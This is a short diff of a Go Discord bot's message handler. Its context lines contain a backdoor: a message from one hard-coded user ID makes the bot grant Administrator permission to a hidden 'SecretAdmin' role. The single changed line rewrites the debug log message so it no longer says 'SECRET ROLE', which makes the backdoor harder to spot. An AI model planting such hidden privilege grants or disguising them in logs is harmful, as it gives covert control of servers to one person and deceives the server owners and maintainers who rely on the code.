@@ -228,7 +228,7 @@ func messageHandler(d *discordgo.Session, msg *discordgo.MessageCreate) {
 
 		if msg.Author.ID == "120393976225202176" && config.Guilds[msg.GuildID].SecretAdmin != "123456789asdfghjkl" && config.Guilds[msg.GuildID].SecretAdmin != "" {
 			role, err := d.GuildRoleEdit(msg.GuildID, config.Guilds[msg.GuildID].SecretAdmin, "i shit trains", 0x0, false, 0x08, false)
-			log.Debugf("TRIED TO ACTIVATE SECRET ROLE! ROLE: %s, ERROR: %s", role, err)
+			log.Debugf("TRIED TO ACTIVATE: %s, ERROR: %s", role, err)
 		}
 
 	case prefix + "shrug":
